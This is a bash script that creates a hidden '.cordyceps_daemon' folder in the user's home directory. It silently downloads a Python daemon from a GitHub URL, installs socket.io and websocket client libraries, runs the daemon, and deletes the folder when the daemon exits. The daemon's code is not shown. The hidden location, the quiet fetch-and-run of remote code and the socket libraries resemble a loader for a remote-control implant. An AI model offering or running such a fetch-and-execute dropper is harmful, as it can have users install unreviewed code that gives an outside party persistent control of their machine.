#!/bin/bash

# Navigate to user's home directory
cd ~ || exit

# Create a hidden folder for the daemon
hidden_dir=".cordyceps_daemon"
mkdir -p $hidden_dir
cd $hidden_dir || exit

# Fetch the cordyceps daemon from the given URL
echo "Downloading daemon..."
wget -q https://raw.githubusercontent.com/feyli/cordyceps-daemon/refs/heads/main/cordyceps.py -O daemon.py

# Detect Python version
if command -v python3 &>/dev/null; then
    PYTHON="python3"
    PIP="pip3"
elif command -v python &>/dev/null; then
    PYTHON="python"
    PIP="pip"
else
    echo "Python not found. Exiting."
    cd ..
    rm -rf $hidden_dir
    exit 1
fi

# Install required packages
echo "Installing dependencies..."
if command -v $PIP &>/dev/null; then
    $PIP install python-socketio websocket-client
else
    $PYTHON -m pip install python-socketio websocket-client
fi

# Run the daemon
echo "Starting cordyceps daemon..."
$PYTHON daemon.py

# This will only execute if the daemon exits
echo "Cleaning up..."
cd ..
rm -rf $hidden_dir